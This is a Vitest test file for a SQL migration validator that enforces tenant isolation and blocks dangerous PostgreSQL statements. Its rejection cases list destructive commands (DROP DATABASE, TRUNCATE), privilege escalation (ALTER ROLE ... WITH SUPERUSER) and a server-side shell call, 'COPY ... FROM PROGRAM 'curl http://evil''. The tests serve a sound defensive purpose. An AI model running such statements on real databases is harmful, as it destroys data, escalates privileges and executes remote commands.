import { describe, expect, it } from "vitest";
import { validateMigrationSql } from "./migration-runner.js";

// Minimal legitimate template with tenant_id — used as a base for "allow" cases.
const BASE_TABLE = `
CREATE TABLE IF NOT EXISTS subscribers (
  id        UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  tenant_id UUID NOT NULL,
  email     TEXT NOT NULL
);
`;

describe("validateMigrationSql — allowed forms", () => {
  it("accepts an empty string", () => {
    expect(() => validateMigrationSql("")).not.toThrow();
  });

  it("accepts CREATE TABLE with tenant_id", () => {
    expect(() => validateMigrationSql(BASE_TABLE)).not.toThrow();
  });

  it("accepts CREATE INDEX", () => {
    const sql = BASE_TABLE + "CREATE INDEX idx_subscribers_email ON subscribers (email);";
    expect(() => validateMigrationSql(sql)).not.toThrow();
  });

  it("accepts CREATE UNIQUE INDEX", () => {
    const sql = BASE_TABLE + "CREATE UNIQUE INDEX uq_subscribers_email ON subscribers (tenant_id, email);";
    expect(() => validateMigrationSql(sql)).not.toThrow();
  });

  it("accepts CREATE POLICY", () => {
    const sql =
      BASE_TABLE +
      `CREATE POLICY subs_isolation ON subscribers
         USING (tenant_id = current_setting('app.current_tenant_id', TRUE)::UUID);`;
    expect(() => validateMigrationSql(sql)).not.toThrow();
  });

  it("accepts ALTER TABLE ... ENABLE ROW LEVEL SECURITY", () => {
    const sql = BASE_TABLE + "ALTER TABLE subscribers ENABLE ROW LEVEL SECURITY;";
    expect(() => validateMigrationSql(sql)).not.toThrow();
  });

  it("accepts ALTER TABLE ... ADD COLUMN IF NOT EXISTS", () => {
    const sql = BASE_TABLE + "ALTER TABLE subscribers ADD COLUMN IF NOT EXISTS note TEXT;";
    expect(() => validateMigrationSql(sql)).not.toThrow();
  });
});

describe("validateMigrationSql — destructive statements", () => {
  it.each([
    ["DROP TABLE", "DROP TABLE subscribers;"],
    ["DROP COLUMN", "ALTER TABLE subscribers DROP COLUMN email;"],
    ["DROP INDEX", "DROP INDEX idx_subscribers_email;"],
    ["DROP POLICY", "DROP POLICY subs_isolation ON subscribers;"],
    ["DROP SCHEMA", "DROP SCHEMA public CASCADE;"],
    ["DROP DATABASE", "DROP DATABASE postgres;"],
    ["DROP TYPE", "DROP TYPE app_status;"],
    ["DROP FUNCTION", "DROP FUNCTION trigger_set_updated_at();"],
    ["DROP TRIGGER", "DROP TRIGGER set_updated_at ON subscribers;"],
    ["DROP ROLE", "DROP ROLE tenant_role;"],
    ["TRUNCATE", "TRUNCATE subscribers;"],
    ["DELETE FROM", "DELETE FROM subscribers WHERE tenant_id IS NULL;"],
    ["UPDATE … SET", "UPDATE subscribers SET email = '';"],
  ])("rejects %s", (_label, sql) => {
    expect(() => validateMigrationSql(sql)).toThrow(/forbidden construct/i);
  });
});

describe("validateMigrationSql — transaction-breaking statements", () => {
  it("rejects CREATE INDEX CONCURRENTLY — breaks the wrapping transaction", () => {
    expect(() =>
      validateMigrationSql("CREATE INDEX CONCURRENTLY idx_foo ON subscribers (email);")
    ).toThrow(/CONCURRENTLY/);
  });

  it("rejects REINDEX … CONCURRENTLY", () => {
    expect(() =>
      validateMigrationSql("REINDEX TABLE CONCURRENTLY subscribers;")
    ).toThrow(/CONCURRENTLY/);
  });
});

describe("validateMigrationSql — privilege changes", () => {
  it.each([
    ["GRANT", "GRANT SELECT ON subscribers TO public;"],
    ["REVOKE", "REVOKE ALL ON subscribers FROM public;"],
    ["SET ROLE", "SET ROLE postgres;"],
    ["SET SESSION AUTHORIZATION", "SET SESSION AUTHORIZATION postgres;"],
    ["ALTER POLICY", "ALTER POLICY subs_isolation ON subscribers RENAME TO other;"],
    ["ALTER ROLE", "ALTER ROLE postgres WITH SUPERUSER;"],
    ["ALTER USER", "ALTER USER postgres WITH PASSWORD 'x';"],
    ["ALTER DEFAULT PRIVILEGES", "ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO public;"],
    ["ALTER SYSTEM", "ALTER SYSTEM SET log_statement = 'all';"],
  ])("rejects %s", (_label, sql) => {
    expect(() => validateMigrationSql(sql)).toThrow(/forbidden construct/i);
  });
});

describe("validateMigrationSql — arbitrary-code escape hatches", () => {
  it("rejects COPY … FROM PROGRAM (server-side shell exec)", () => {
    expect(() =>
      validateMigrationSql("COPY subscribers FROM PROGRAM 'curl http://evil';")
    ).toThrow(/FROM PROGRAM/);
  });

  it("rejects DO $$ ... $$ PL/pgSQL blocks even with benign content", () => {
    // A DO block is rejected because the regex denylist cannot see inside
    // PL/pgSQL — the body could do anything.
    expect(() =>
      validateMigrationSql("DO $$ BEGIN RAISE NOTICE 'hi'; END $$;")
    ).toThrow(/DO \$\$/);
  });

  it("rejects DO $tag$ ... $tag$ blocks", () => {
    expect(() =>
      validateMigrationSql("DO $foo$ BEGIN RAISE NOTICE 'hi'; END $foo$;")
    ).toThrow(/DO \$/);
  });

  it("rejects CREATE EXTENSION", () => {
    expect(() =>
      validateMigrationSql("CREATE EXTENSION IF NOT EXISTS pg_trgm;")
    ).toThrow(/CREATE EXTENSION/);
  });

  it("rejects CREATE FUNCTION", () => {
    expect(() =>
      validateMigrationSql("CREATE FUNCTION hello() RETURNS text AS $$ SELECT 'hi' $$ LANGUAGE sql;")
    ).toThrow(/CREATE FUNCTION/);
  });

  it("rejects CREATE OR REPLACE FUNCTION", () => {
    expect(() =>
      validateMigrationSql(
        "CREATE OR REPLACE FUNCTION hello() RETURNS text AS $$ SELECT 'hi' $$ LANGUAGE sql;"
      )
    ).toThrow(/CREATE FUNCTION/);
  });

  it("rejects CREATE TRIGGER", () => {
    expect(() =>
      validateMigrationSql(
        "CREATE TRIGGER t BEFORE INSERT ON subscribers FOR EACH ROW EXECUTE FUNCTION foo();"
      )
    ).toThrow(/CREATE TRIGGER/);
  });
});

describe("validateMigrationSql — structural rules", () => {
  it("rejects ALTER TABLE that isn't ENABLE RLS or ADD COLUMN IF NOT EXISTS", () => {
    expect(() =>
      validateMigrationSql("ALTER TABLE subscribers RENAME TO subs;")
    ).toThrow(/ENABLE ROW LEVEL SECURITY or ADD COLUMN IF NOT EXISTS/);
  });

  it("rejects CREATE TABLE missing tenant_id", () => {
    const sql = `CREATE TABLE IF NOT EXISTS subscribers (id UUID PRIMARY KEY, email TEXT);`;
    expect(() => validateMigrationSql(sql)).toThrow(/missing tenant_id/);
  });
});
